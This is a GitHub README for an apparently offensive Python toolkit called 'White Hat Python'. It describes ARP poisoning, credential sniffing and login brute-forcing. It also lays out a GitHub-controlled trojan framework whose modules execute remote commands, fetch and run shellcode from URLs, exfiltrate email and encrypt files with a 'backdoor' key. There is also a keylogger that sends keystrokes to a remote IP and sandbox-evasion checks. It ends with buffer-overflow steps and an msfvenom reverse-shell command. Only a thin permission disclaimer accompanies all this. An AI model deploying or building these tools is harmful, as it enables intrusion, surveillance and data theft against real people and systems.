# White Hat Python Version 1.1
![image](https://github.com/user-attachments/assets/cfd01c2f-932c-44c7-9982-2a544c28ec5b) <br />
# By: Nicholas Fisher

**Python Library Configuration Script:** <br />
**Important Note: Before using the script below please download the swig tool with with either of the commands below:** <br />
Ubuntu or Debian-based systems: sudo apt-get install swig <br />
Red Hat-based systems like Fedora or CentOS: sudo yum install swig <br />
1. pylib_config.sh - The script is designed to set up a Python development environment on Kali Linux for ethical hacking purposes. It updates system packages, installs necessary system libraries, and then proceeds to install various Python libraries commonly used by ethical hackers. These libraries include tools for network scanning (scapy, nmap), web scraping and parsing (beautifulsoup4, lxml), interacting with GitHub (github3.py), handling encryption and encoding (base64, pycryptodomex), sending emails (smtplib), working with Windows hooks (pywin32, pywinhook), and more. <br />

**Visual Studio Code with Gitbash Terminal Library Configuration Script:** <br />
vs_code_pylib_conf.sh - This script configures a Visual Studio Code environment with Git Bash terminal for Python development. It sets up a virtual environment named `venv`, installs system packages and Python libraries such as `scapy`, `python-nmap`, `requests`, `lxml`, `beautifulsoup4`, `github3.py`, and others using `pip`. Additionally, it includes steps for installing `setuptools` and `pynput` if needed, ensuring a complete setup for tasks like network scanning, web requests, GUI development, and cryptography. <br />

**PyCharm:** <br />
1. libpcap-pycharm.py - This script is used to upgrade the base scapy package you get in PyCharm to get the Packet, IPField, XShortField, XByteField. and TCP classes from the Scapy Python Package. <br />

**Disclaimer: These scripts should only be used in cases where the user has permission to use these scripts on the subject systems!** <br />

**Import Note: Please read this statement carefully: By downloading any of the scripts in this repository, you, as the user, take full responsibility for storing, and using these scripts. You also take full responsibility for any misuse of these malicious codes. Finally, Please note that any data the Trojan extracts will be posted to a GitHub repository, and if that repository is public, all the extracted data will be available for the whole world to see.** <br />

# Packet Sniffers and Port/Vulnerability Scanners <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/faa2eb23-9d2f-4a7e-911a-84fc0b379440) <br />
**Important Note: For net_terrorizer.py to work please install the scapy and nmap python libraries in linux using the following commands below:** <br />
   pip install scapy <br />
   sudo apt-get update <br />
   sudo apt-get install nmap <br />
   pip install python-nmap <br />

**The Following List gives a short description of all the scripts in this group:** <br />
1. net_terrorizer.py - This Python script provides a comprehensive tool for conducting customizable Nmap network scans, allowing users to interactively select specific Nmap scripts and scan options. Users can specify a list of remote IP addresses or CIDR notations and define port ranges for their scans. The script prompts users to choose from a wide array of Nmap scripts, each designed to perform different tasks such as detecting web server honeypots, analyzing firewall rules, retrieving service banners, and identifying vulnerabilities. New additions include scripts for detecting SQL injection and XSS vulnerabilities, identifying SSH authentication methods, and checking for the presence of backdoors in FTP servers. After executing the scan, the script offers the option to save the detailed results, including any found CVEs and Metasploit modules, to a user-defined text file. This functionality makes the script a powerful and flexible tool for network exploration, security assessment, and detailed documentation. <br />
2. darknet_recon.py - The script provided is a Python tool for conducting network scans using Nmap and searching for Metasploit modules corresponding to identified vulnerabilities. It prompts the user to input remote IP addresses or CIDR notations for scanning. After performing Nmap scans to discover hosts and their open ports along with potential vulnerabilities, the script simulates finding CVE IDs. It then utilizes Metasploit's `msfconsole` command-line tool to search for exploit modules related to the identified CVEs. The user is prompted to enter the superuser password when required for executing commands. Overall, this script serves as a versatile tool for network reconnaissance and vulnerability assessment, seamlessly integrating Nmap and Metasploit functionalities. <br />
3. dark_wizard_gui.py - **Important Note: Please use this script as a superuser for it to work, and know that if you leave the port field blank it will do a full port scan, and will take time to load!** This Python script creates a graphical user interface (GUI) application named "Dark Net Wizard" using Tkinter. The application allows users to perform Nmap scans with firewall evasion techniques on specified target IP addresses or CIDR ranges. It includes options for inputting target ports or port ranges, and it displays the scan results, including any found Common Vulnerabilities and Exposures (CVEs) and Metasploit exploit modules if they exist. The GUI features a dark purple background color, an image display at the top (which can be replaced with a custom image link), input fields for IP addresses and ports, buttons for scanning and exiting the application, and an output box for displaying scan results and messages. <br />

**Example outputs of some of the scripts and gui!** <br />
1. dark_wizard_gui.py gui: <br />
 ![image](https://github.com/FishyStix12/WHPython_v1.02/assets/102126354/e91027d1-d1d7-4e23-b818-b7ea187cc533) <br />

3. net_terrorizer.py output: <br />
   Enter the remote IP address or CIDR notation to scan (press Enter to exit): 192.168.0.1 <br />
   Enter the port/ports to scan (leave empty for full scan): 80 <br />
   Scanning IP: 192.168.0.1 <br />
   Starting Nmap scan for host: 192.168.0.1 <br />
   IP source: 192.168.0.2, IP destination: 192.168.0.1 <br />
   Nmap scan results for host: 192.168.0.1 <br />
   Host: 192.168.0.1 <br />
   Protocol: tcp <br />
   Port: 80    State: open    Service: http    Product: Apache    Version: 2.4.29    Extra Info: (Ubuntu) <br />
   Script: vulners <br />
   CVEs Found: CVE-2019-0211, CVE-2018-17199 <br />

   Enter the remote IP address or CIDR notation to scan (press Enter to exit): 192.168.0.0/24 <br />
   Enter the port/ports to scan (leave empty for full scan): <br />
   Scanning IP: 192.168.0.1 <br />
   Starting Nmap scan for host: 192.168.0.1 <br />
   Scanning IP: 192.168.0.2 <br />
   Starting Nmap scan for host: 192.168.0.2 <br />
   IP source: 192.168.0.3, IP destination: 192.168.0.2 <br />
   IP source: 192.168.0.3, IP destination: 192.168.0.1 <br />
   Nmap scan results for host: 192.168.0.1 <br />
   Host: 192.168.0.1 <br />
   Protocol: tcp <br />
   Port: 80    State: open    Service: http    Product: Apache    Version: 2.4.29    Extra Info: (Ubuntu) <br />
   Script: vulners <br />
   CVEs Found: CVE-2019-0211, CVE-2018-17199 <br />

   Nmap scan results for host: 192.168.0.2 <br />
   Host: 192.168.0.2 <br />
   Protocol: tcp <br />
   Port: 22    State: open    Service: ssh    Product: OpenSSH    Version: 7.2p2    Extra Info: Ubuntu Linux; protocol 2.0 <br />
   Script: vulners <br />
   CVEs Found: CVE-2017-15906 <br />

   Enter the remote IP address or CIDR notation to scan (press Enter to exit): <br />
   Exiting... <br />

4. darknet_recon.py output: <br />
   Enter the remote IP address or CIDR notation to scan (press Enter to exit): 192.168.1.0/24 <br />
   Nmap scan results for host: 192.168.1.1 <br />
   Host: 192.168.1.1 <br />
   Protocol: tcp <br />
   Port: 22    State: open    Service: ssh    Product: OpenSSH    Version: 7.6p1 Ubuntu    Extra Info: protocol 2.0 <br />
   Port: 80    State: open    Service: http    Product: nginx    Version: 1.14.0    Extra Info: (Ubuntu) <br />

   Metasploit modules for the found vulnerabilities: <br />

   Vulnerability: CVE-2017-1001000 <br />
   No Metasploit modules found for vulnerability: CVE-2017-1001000 <br />

   Vulnerability: CVE-2019-6977 <br />
   Module: exploit/linux/http/paloalto_traps_unauth_rce (Linux) <br />

   Vulnerability: CVE-2018-1000861 <br />
   No Metasploit modules found for vulnerability: CVE-2018-1000861 <br />


# Scapy Unleashed: Conquer the Network <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/21d15755-bd6b-496b-8f76-7e624c0b65c1) <br />
**Important Note: For these scripts to work install the appropriate libraries using the commands below:** <br />
  pip install multiprocessing <br />
  pip install scapy <br />
  pip install opencv-python <br />
  
**Important Note: For arp_poiser.py to work:  Please use the script in the following syntax below:** <br />
  python script.py <victim_ip> <gateway_ip> <interface> <br />
   
**The Following List gives a short description of all the scripts in this group:** <br />
1. tport_sniffer.py - # The script enables remote packet sniffing on a target host specified by the user. It prompts the user to input the target host's IP address and port, establishes a TCP connection to the remote host, and then allows the user to define packet filters based on port numbers. Once configured, the script initiates packet sniffing on the specified ports, intercepting TCP packets and checking for payload containing sensitive information like usernames or passwords. If such data is detected, it prints out the destination IP address and the payload content for further inspection. <br />
2. arp_poiser.py - The script allows users to initiate an ARP poisoning attack and packet sniffing on a remote host by inputting the target host's IP address, port, gateway IP address, and interface. Leveraging Scapy and multiprocessing, it efficiently handles packet manipulation and parallel processing. Upon execution, it prompts users for necessary information, initializes the attack, and subsequently sniffs packets directed to the target host, providing a seamless and interactive experience. <br />
3. rcap.py - The provided Python script is designed to extract and save images from HTTP traffic stored in a PCAP file. It utilizes the Scapy library for packet manipulation and extraction. The script is a Python tool designed to parse pcap files containing network traffic data, particularly HTTP traffic, and extract images transferred over HTTP from a specified target host. Users can interactively provide inputs such as the path to the pcap file, the target host's IP address, the target port number, and the output directory for saving the extracted images. Leveraging the Scapy library for packet manipulation, the script identifies relevant packets based on the specified target IP address and port number. It then extracts images from HTTP responses, considering content type and encoding, and saves them to the designated output directory. With its interactive nature and capability to process pcap files, this script offers a flexible and efficient solution for extracting images from network traffic data. <br />
4. detect.py -This script utilizes OpenCV for remote face detection and processing. Upon establishing a connection with a remote host specified by the user, it scans a designated directory for JPEG images. Employing a convolutional neural network (CNN)-based face detection model, it accurately identifies faces within each image. Extracted faces are then combined into a single composite image. Upon completion of processing all images, the composite image is transmitted back to the local host. This script is particularly useful for scenarios requiring distributed face detection tasks across networked devices, ensuring efficient and accurate processing of image data. <br />
5. SeqSensei.py - The `SeqSensei` script is an advanced network analysis tool that empowers users to send and analyze TCP packets with precision. Through an interactive menu, users can craft and send custom TCP packets with SYN, RST, FIN, and ACK flags, allowing for comprehensive network testing and analysis. The script also features a packet capture mode that listens on a specified network interface to identify and examine ACK packets, extracting crucial information such as the Next Sequence Number (NSN). Ideal for network engineers, security professionals, and ethical hackers, **SeqSensei** combines interactive packet crafting with real-time packet analysis to facilitate deeper insights into TCP communications and network behavior. <br />

**Example outputs of some of the scripts!** <br />
1. tport_sniffer.py output: <br />
Enter the target host IP address: 192.168.1.100 <br />
Enter the target host port: 80 <br />
Do you want to add more filters? (yes/no): yes <br />
Enter the port number: 443 <br />
Do you want to add more filters? (yes/no): no <br />
Applying filter: tcp port 80 or tcp port 443 <br />
[*] Destination: 192.168.1.100 <br />
[*] POST /login HTTP/1.1 <br />
Host: 192.168.1.100 <br />
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0 <br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 <br />
Accept-Language: en-US,en;q=0.5 <br />
Accept-Encoding: gzip, deflate <br />
Content-Type: application/x-www-form-urlencoded <br />
Content-Length: 29 <br />
Connection: close <br />
Cookie: sessionid=abcdef1234567890 <br />
Upgrade-Insecure-Requests: 1 <br />
username=admin&password=secretpass <br />

2. SeqSensei.py output : <br />
   Menu: <br />
   1. Send a custom TCP packet (SYN, RST, FIN, ACK) <br />
   2. Capture and analyze ACK packets <br />
   3. Exit <br />
<br />
   Enter your choice (1, 2, 3): 2 <br />
<br />
   Enter network interface to sniff on (default: eth0): eth0
<br />
   Starting packet capture on eth0... <br />
<br />
   Captured ACK Packet: <br />
   Source IP: 192.168.1.100 <br />
   Destination IP: 192.168.1.200 <br />
   Sequence Number (SEQ): 1000 <br />
   Next Sequence Number (ACK/NSN): 2000 <br />
   -------------------------------------------------- <br />

# Web Exploitation Unleashed <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/7e294907-a92a-4ff3-aa09-fc3e38c0c2bc) <br />
**Important Note: For the Web Scripts tp work please use the following linux commands to install the appropriate libraries:** <br />
  pip install requests <br />
  pip install lxml <br />
  pip install beautifulsoup4 <br />

**Important Note: For the ravager.py script to run please enter the following commands in your terminal:** <br />
  cd ~/Downloads <br />
  wget https://www.netsparker.com/s/research/SVNDigger.zip <br />
  unzip SVNDigger.zip <br />

**The Following List gives a short description of all the scripts in this group:** <br />
1. web_pather.py - This script performs directory busting on a remote web server specified by the user. It starts the enumeration from the root directory of the server and recursively explores all directories and files. The script generates URLs for common file types and checks if they exist on the server. Additionally, it parses HTML content from directory listings to discover subdirectories and continues enumeration. After completing the directory busting, the script prompts the user to enter a file name to save the discovered URLs. It then appends the results to the specified file, allowing the user to review the findings conveniently. This script provides a straightforward and automated approach to identify potentially sensitive or vulnerable directories and files on a web server.
2. ravager.py - This script is a directory busting tool designed to enumerate directories and files on a web server. It prompts the user to input the target host IP address, port, and the path to a wordlist file containing potential directory and file names. Utilizing threading for concurrent requests, it sends HTTP requests to the specified host, attempting to access each directory and file combination generated from the provided wordlist. If a directory or file is found, it outputs a success message along with the corresponding URL. This tool is commonly used in security testing to identify hidden or unprotected resources on web servers. <br />
3. login_bruteforce.py - The script is a Python automation tool designed to perform brute-force login attempts on a web application's login form hosted on a remote server. It prompts the user for the target host's IP address, port, and the paths to files containing usernames and passwords. Using the provided information, it constructs the login URL and reads in the username and password lists from the specified files. The script then iterates through each combination of username and password, attempting to log in using HTTP POST requests. If a successful login is detected, it outputs the credentials used. This script provides a basic framework for automating the testing of login forms for security vulnerabilities. <br />

**Example outputs of some of the scripts!** <br />
1. web_pather.py output: <br />
   URL: http://example.com <br />
   Threads: 10 <br />
   
2. ravager.py output: <br />
   Please input target host IP address: 192.168.1.100 <br />
   Please input target port: 80 <br />
   Enter path to all.txt file: /path/to/wordlist.txt <br />
   Resuming wordlist from resume_word <br />
   Press return to continue. <br />
   Success (200: http://192.168.1.100:80/admin/) <br />
   Success (200: http://192.168.1.100:80/css/) <br />
   Success (200: http://192.168.1.100:80/js/) <br />
   Success (200: http://192.168.1.100:80/images/) <br />
   .... <br />

3. login_bruteforce.py output: <br />
   Please enter the target host IP address: 192.168.1.100 <br />
   Please enter the target port: 8080 <br />
   Please enter the path to your usernames dictionary in Linux: /path/to/usernames.txt <br />
   Please enter the path to your passwords dictionary in Linux: /path/to/passwords.txt <br />

   Successful login with username: admin and password: password123 <br />
   Failed login attempt with username: admin and password: 123456 <br />
   Failed login attempt with username: user1 and password: password123 <br />
   ... <br />


# Trojan Framework <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/239280f9-d78f-4e2d-aace-6fb0b4e59177) <br />

**Important Note: For this Trojan to work install the appropriate libraries using the commands below, or head to pypi.org/project/github3.py' to automate the process:** <br />
  pip install github3.py <br />
  pip install base64 <br />
  pip install importlib <br />
  pip install json <br />
  pip install random <br />
  pip install sys <br />
  pip install threading <br />
  pip install time <br />
  pip install datetime <br />

**Please Note: Any of these python scripts can be used as the Trojan's Modules.** <br />

**Important Note to use github_trojan.py, Please get the necassary token input by doing the following settings:** <br />
1. Click on user Profile on left hand side. <br />
2. Click on developer settings. <br />
3. Click on Personal Access Tokens. <br />
4. Click on the classic Token. <br />
5. Click Generate New Token. <br />
6. Click on the Generate Classic New Token Option. <br />
7. Finish Generating Token with appropriate settings. <br />
8. Finally, copy the token, and paste it into a text file. <br />

**Important Note: To create the basic structure for this repo enter the following on the Linux Command Line or use the provided configuration Bash file:** <br />
  $ mkdir \<trojan_name\> <br />
  $ cd \<trojan_name\> <br />
  $ git init <br />
  $ mkdir modules <br />
  $ mkdir config <br />
  $ mkdir data <br />
  $ touch .gitignore <br />
  $ git add . <br />
  $ git commit -m "Adds repo structure for trojan" <br />
  $ git remote add origin https://github.com/<yourusername\>/<torjan_github_repository\>.git <br />
  $ git push origin master <br />

**The Following List gives a short description of all the scripts in this group:** <br />
**1. Set up/ 2. Update/ 3. Pull Data: (Run scripts 2 and 3 in the home directory of your Trojan!)** <br />
1. trojan_linux_framewrk_conf.sh - This script is used to create the initial structure for the repo. The config directory holds unique configuration files for each trojan, so each Trojan can contain a seperate configuration file. The modules directory contains any modular code that the trojan should pick up and then execute. The data directory is where the trojan will check any collected data. <br />
2. push_trojan_updates.sh - This script automates the process to push new features into the active Trojan on Github. To ensure this script works please place it in the <trojan_name> directory. You will need your Github username and password to push the Trojan update. <br />
3. data_pull.sh - This script pulls the results of the running Trojan Modules. <br />

**Configuration:** <br />
1. modul3s.json - is just a simple list of modules that the remote trojan should run. <br />
2. github_trojan.py - This script  implements a Trojan horse program that can be used for remote execution of tasks on a target machine. It uses GitHub as a repository for storing configuration files and modules. The program continuously checks for updates in the repository, retrieves new modules or configurations, and executes them. This allows for dynamic and remote control of the Trojan's behavior. To use the code, you would need to set up a GitHub repository with the necessary configuration files and modules. You would also need to generate a personal access token for GitHub API access. An example of using the code would be to create a repository with a configuration file specifying which modules to run and their parameters. The Trojan would then fetch this configuration, run the specified modules, and store the results back in the repository.  !!Belongs in the config module of the Trojan Framework!! <br />

**Example Layout of the JSON script below: (1 underscore + space = 1 tab)**
[ <br />
_ { <br />
_ _ "module" : "script1" <br />
_ }, <br />
_ { <br />
_ _ "module" : "script2" <br />
_ } <br />
] <br />
Important Note: Please run the push_trojan_updates.sh file in the config module to push changes into the active trojan! <br />

# Trojan Modules <br />
![image](https://github.com/FishyStix12/ShadowReaper_Trojan/assets/102126354/3bde6b1e-407f-47e8-b68c-d246ee637887) <br />
**Important Note: Please pay attention to the top comments of some of these Trojan Modules as you will need to make edits to the scripts such as inputing the target IP Address, or entering the desired port on the target to connect to.** <br />

**Important Note: Please put these scripts in the Modules Directory of the Torjan Framework, and update the JSON File in the config directory.** <br />

**Important Note: For this Trojan to work install the appropriate libraries using the commands below, or head to pypi.org/project/github3.py' to automate the process:** <br />
  pip install github3.py <br />
  pip install base64 <br />
  pip install importlib <br />
  pip install json <br />
  pip install random <br />
  pip install sys <br />
  pip install threading <br />
  pip install time <br />
  pip install datetime <br />
  pip install python-magic <br />

**Modules:** <br />
1. auto_bruteforce.py - **Important note update the script to just run on the target ip address so it doesn't ask for an input!** The script is a multi-platform Python tool designed for automating the brute force login process on web applications. It prompts the user to input the login URL, as well as the paths to files containing lists of usernames and passwords. The script then iterates through all combinations of usernames and passwords, attempting to log in to the specified URL. It utilizes multiprocessing to parallelize the login attempts, enhancing efficiency. Upon successful login, the script outputs the corresponding credentials, while also providing feedback on failed attempts. This versatile tool can be used across both Windows and Linux operating systems, providing a flexible solution for testing and securing web applications. <br />
2.  grimreaperexecutor.py - This script serves as a clandestine tool for remote command execution, designed for covert operations. It operates as a Trojan, silently awaiting commands from a centralized control and command server (C&C). Once deployed, the Trojan continuously polls the C&C server for instructions. It can execute various types of commands, including shell commands ('cmd'), running shellcode from a local file ('file'), or fetching and executing shellcode from a specified URL ('url'). Results of the executed commands are securely transmitted back to the C&C server. To use it, simply deploy the script on the target system, ensuring that the C&C server URL is correctly configured. Through the C&C interface, operatives can remotely control and manipulate the target system with discretion, making it a powerful tool for clandestine operations. <br />
3. blackwidow.py - This script automates various dark tasks including email exfiltration, brute force attacks, FTP operations, and file transmission. It utilizes various modules to perform tasks such as sending test emails, extracting emails from a Gmail account, brute forcing FTP credentials, uploading files via FTP, transmitting files over TCP/IP, and extracting files from directories recursively. The script is designed to execute all tasks automatically, providing a streamlined approach to conducting various dark operations without user intervention. <br />
4. grimrelay.py - This script designed to facilitate secure and covert file transmission across networks. Utilizing a combination of FTP brute force tactics and direct TCP/IP communication, ensures efficient and discreet data transfer between endpoints. With platform compatibility for Windows, Linux, and macOS, this script empowers users to transmit sensitive files with ease, offering a clandestine solution for clandestine operations. <br />
5.  phantomlock.py - The provided code is a Python script designed to automate the encryption, transmission to a remote server, and decryption of files. Upon execution, the script encrypts all files within the current directory using AES encryption with a randomly generated session key and then encrypts this session key with RSA. The encrypted files are then sent to a specified server URL using HTTP POST requests. After successful transmission, the script instructs the user on how to access the files from the server, emphasizing the importance of keeping this information secure. Additionally, the script includes functionality to decrypt files using a backdoor private key. To use the script, simply run it on the target system. Ensure that the appropriate libraries (Cryptodome and requests) are installed and configured correctly, and modify the SERVER_URL variable to match the URL of your server. Optionally, provide the path to the backdoor private key (backdoor_private_key.pem) for decryption purposes. <br />
6. shadowsender.py - This script, is designed to automate the process of sending emails from a target email address to a host email address in a covert manner. The script utilizes the smtplib library to establish a connection to the SMTP server and send emails. The user needs to specify the SMTP server details, such as the server address and port, as well as the target email address, host email address, and the host email's password. Once the necessary details are provided, the script automatically sends an email from the target email address to the specified host email address without any user interaction. This script can be used for various purposes, including data exfiltration, communication in covert operations, or as a part of a malicious attack. To use the script, simply modify the necessary variables such as the SMTP server details, target email address, host email address, and password, and then run the script. <br />
7. abyssalobserver.py - This script is a system monitoring tool designed to track and analyze processes running on various operating systems. It provides insight into process creation, resource usage, and user privileges, offering a comprehensive overview of system activity. With a focus on efficiency and accuracy, the script operates seamlessly across different platforms, ensuring robust performance and facilitating informed decision-making for system administrators and security professionals. <br />
8. phantomfile.py - This script provides comprehensive monitoring of file system changes and clipboard activities across different operating systems. It employs platform-specific techniques to track file creations, deletions, modifications, renames, copies, and pastes, ensuring heightened awareness of file-related actions. Designed to operate seamlessly on Windows, macOS, and Linux, it offers a vigilant approach to observe and record file events, enhancing security and facilitating forensic analysis when necessary. <br />
9. dirlister.py - This script implements a directory listener module that recursively lists all files in all directories starting from the current directory. The list_files function uses os.walk to traverse all directories and collect file paths, which are then returned as a list of strings. The run function calls list_files with the current directory and returns the list of files as a string. To use the code, simply import the module and call the run function. <br />
10. environment.py - This script defines a function get_environment_variables that retrieves and returns the environment variables of the system. It first prints a message indicating that it is in the environment module, then uses the os.environ dictionary to fetch the environment variables. Finally, it iterates over the dictionary and prints each environment variable along with its corresponding value. This script can be used to quickly view the environment variables set on a system, which can be useful for debugging or understanding the current system configuration. <br />
11. platformer.py - The provided Python script utilizes the platform module to gather detailed information about the operating system of a target host. This information includes the operating system name (system), network name of the machine (node), operating system release (release), operating system version (version), machine type (machine), and processor type (processor). The get_os_details function collects this information into a dictionary and returns it. When the script is executed, it calls the get_os_details function and then iterates over the dictionary to print each key-value pair in a readable format. <br />

**Example outputs of some of the scripts!** <br />
1. environment.py output: <br />
   [*] In environment module. <br />
   PATH: /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin <br />
   LANG: en_US.UTF-8 <br />
   HOME: /Users/user <br />
2. platformer.py output: <br />
   system: Windows <br />
   node: DESKTOP-ABC123 <br />
   release: 10 <br />
   version: 10.0.19041 <br />
   machine: AMD64 <br />
   processor: Intel64 Family 6 Model 142 Stepping 11, GenuineIntel <br />

# Cyber Surveillance Suite <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/219d6c1a-5281-438a-ab31-695c8d685190) <br />
**Important Note: For these scripts to work install the appropriate libraries using the commands below:** <br />
  pip install pythoncom <br />
  pip install pyWinhook <br />
  pip install psutil <br />
  pip install pynput <br />
  pip install ctypes <br />
  pip install os <br />
  pip install platform <br />
  pip install time <br />
  pip install pywin32 <br />
  pip install python3-xlib <br />
  pip install argsparce <br />

**The Following List gives a short description of all the scripts in this group:** <br />
1. keylogger.py - This script implements a keylogger, a tool designed to capture keystrokes on a target system. The script is platform-independent, capable of running on both Windows and Linux operating systems. Upon execution, the user is prompted to input a remote target IP address where the captured keystrokes will be sent. Once the IP address is provided, the keylogger begins monitoring keyboard input in the foreground, logging each keystroke along with details about the active window. For Windows systems, it utilizes modules like `pyHook` and `win32gui` to capture keyboard events, while for Linux systems, it employs `pynput`. This script is designed for ethical hacking scenarios, aiding in penetration testing on approved systems within legal boundaries. <br />
2. screenshotter.py - The script is a cross-platform utility designed to facilitate the remote capture and transmission of screenshots. It intelligently adapts to the underlying operating system, utilizing platform-specific libraries such as `pywin32` for Windows and `pyscreenshot` for Linux, to capture screenshots. The user is prompted to specify the local host's IP address and the port on which the script will listen for incoming screenshot transmissions. Upon receiving a connection from a remote host, the script receives the screenshot data, decodes it, and saves it as a PNG file locally. Exception handling is implemented to ensure robustness and error resilience during execution. This script serves as a versatile tool for capturing and receiving screenshots across diverse computing environments. <br />
3. executer.py - The provided script offers a versatile toolkit for executing commands, running local files, or deploying shellcode retrieved from a URL on a remote host. It employs Python's subprocess and socket modules to enable seamless communication between the user's machine and the target system. Users can input commands directly, execute local files by specifying their paths, or fetch shellcode from a URL for remote execution. The script validates inputs, ensuring proper execution and safeguarding against potential errors. With its modular design and robust error handling, this script serves as a flexible solution for remote management and execution tasks across various platforms. <br />
4. detective_sandbox.py - The script provided is a versatile tool designed to ascertain whether a remote host, specified by the user with an IP address and port, likely operates within a sandbox environment. It first checks the local system environment, distinguishing between Ubuntu Sandbox and other configurations. Utilizing platform-specific libraries, it monitors user activity, detecting keystrokes, mouse clicks, and double-click events, while also tracking time since the last user input. However, its key feature lies in the function `is_sandbox(ip, port)`, which establishes a connection to the remote host and scrutinizes its behavior. If the connection succeeds, indicating a responsive host, it deduces that the host is not a sandbox. Conversely, if the connection fails, it suggests the host may be operating within a sandbox environment. This capability enables users to assess the nature of remote systems, aiding in security assessments and network reconnaissance. <br />

**Example outputs of the detective_sandbox.py script!** <br />
You are not in an Ubuntu Sandbox. <br />
Enter remote host IP address: 192.168.1.100 <br />
Enter remote host port: 22 <br />
The remote host appears to be a sandbox environment. <br />


# Extract-o-Mania <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/f92ae210-0c3a-461c-87bb-203b35d92b86) <br />
**Important Note: For most of this scripts to work you will need a usernames list and passwords list text files for brute forcing!** <br />

**Important Note: For these scripts to work install the appropriate libraries using the commands below:** <br />
pip install pycryptodomex <br />
pip install smtplib <br />
pip install pywin32 <br />
pip install ftplib <br />
pip install flask <br />

**The Following List gives a short description of all the scripts in this group:** <br />
1. cryptoraptor.py - The script is a versatile file encryption tool designed to offer robust security through advanced encryption algorithms. It employs a combination of AES and RSA encryption, utilizing key sizes optimized for enhanced security. Specifically, RSA keys with a substantial size of 8192 bits are employed for secure key exchange, while AES keys of 512 bits ensure strong symmetric encryption. Users can encrypt and decrypt files seamlessly, with the script facilitating key generation and transmission for seamless cryptographic operations. With a user-friendly interface and heightened security measures, the script provides a reliable solution for safeguarding sensitive data during transmission and storage. <br />
2. sneakysender.py - The script is a versatile tool designed to facilitate various email-related tasks and FTP brute-force attacks. It features a user-friendly menu interface that allows users to choose from several options. These options include sending test emails, exfiltrating emails from Gmail accounts, and brute-forcing FTP servers. The script prompts users for necessary details such as SMTP server settings, email addresses, and passwords, enabling seamless execution of chosen tasks. Additionally, it has been enhanced to ensure exfiltrated emails are sent to a specified local host email address, ensuring efficient and centralized management of retrieved data. Overall, the script offers a comprehensive solution for email-related operations and FTP security assessments. <br />
3. transmittron.py - The provided Python script facilitates file transmission and FTP server interaction, offering a versatile toolkit for network operations. The script boasts a user-friendly interface where users can select various functionalities from a main menu. Notably, it enables direct file transmission to a specified client IP address and port via TCP/IP. Moreover, it supports FTP server interaction, allowing users to upload files to a target FTP server. Additionally, the script includes a robust FTP brute-force mechanism, leveraging provided username and password dictionaries to attempt login credentials systematically. This combination of features empowers users with flexible and efficient tools for managing file transfers and interacting with FTP servers securely. <br />
5. codeninja.py - The upgraded script facilitates remote execution by allowing users to input the target host's IP address and port. It employs the Flask framework to create an HTTP server for handling various actions such as transmitting files, brute-forcing FTP servers, sending emails, and exfiltrating email contents. Users interact with the script through a command-line interface, selecting options from the main menu. Each choice triggers a corresponding function, enabling tasks like transmitting files directly to a client, brute-forcing FTP credentials, sending test emails, or exfiltrating emails from Gmail or Outlook accounts. This script empowers users with remote control capabilities, making it adaptable for diverse cybersecurity scenarios. <br />

**Example outputs of some of the scripts!** <br />
    1. cryptoraptor.py output: <br />
       Enter the name for the directory to store keys: encryption_keys <br />
       Enter the target host IP address: 192.168.1.100 <br />
       Enter the target port: 12345 <br />
       Choose an option: <br />
       1. Encrypt file(s) <br />
       2. Decrypt file(s) <br />
       3. Exit <br />
       Enter your choice: 1 <br />
       Enter the number of files to encrypt: 1 <br />
       Enter the file path to encrypt: /path/to/file.txt <br />
       Encryption of /path/to/file.txt complete. <br />
       Choose an option: <br />
       1. Encrypt file(s) <br />
       2. Decrypt file(s) <br />
       3. Exit <br />
       Enter your choice: 2 <br />
       Enter the number of files to decrypt: 1 <br />
       Enter the file path to decrypt: /path/to/file.txt.enc <br />
       Enter the path to the private key: /path/to/private_key.pem <br />
       Decryption of /path/to/file.txt.enc complete. <br />
       Choose an option: <br />
       1. Encrypt file(s) <br />
       2. Decrypt file(s) <br />
       3. Exit <br />
       Enter your choice: 3 <br />
       Exiting... <br />

# Fun with Exploitation <br />
![Screenshot 2024-04-19 084402](https://github.com/FishyStix12/WHPython_v1.02/assets/102126354/173dc5be-6bb2-4549-9a10-593cc51296e3) <br />
**XtremeGui.py** <br />
**Important Note: Please use statrun.spk in the following syntax - `generic_send_tcp <Target IP> <Target Port> statrun.spk SKIPVAR SKIPSTR`**

**Important Note:** <br />
After running fuzzywuzzy.py run this command in linux to create the random bytes of data: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <byte size>`, then run the WIns_overflow.py script with these randomly generated bytes to cause a buffer overflow in the stack, then record the random bytes that have overwritten the target EIP Register, and find the offset of those bytes. Then run the following command to find the exact offset of the random bytes in the EIP register: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337`. Then run the WIns_OvrWrte.py script to check whether or not you can control the EIP registar. (Which we will know if the EIP Registar is overwritten with 4 Ds (Which is an ASCII value of 44). Then run the script with the sketchcharacters.py script to send badchars along with the shellcode. Then in immunity debugger click on the ESP register value and click follow in dump to see if any of the badchars create any problems in the shellcode. If there are no found errors with the badchars then use mona.py modules in Immunity Debugger to see the protection settings of various modules (Signified by Falses). Then use the WIn_Jump.py to send the x86 architecture stores values in the Little Endian format for the Return Address of the vulnerable Modules to the target EIP Registar. Then run `msfvenom -p <payload> (ex: windows/shell_reverse_tcp) LHOST=<IP address> LPORT=<port> EXITFUNC=thread -f <file type> (ex: c) -a <architecture> (ex: x86) -b <bad characters> (ex: “\x00”)`. Then run the WIn_shellcode.py script to inject the generated shellcode into the EIP register and exploit the target vulnerable server. For more information please use the link below: <br />
https://infosecwriteups.com/exploiting-a-windows-based-buffer-overflow-e4d1b6f6d5fb <br />
<br />
**The Following List gives a short description of all the scripts in this group:** <br />
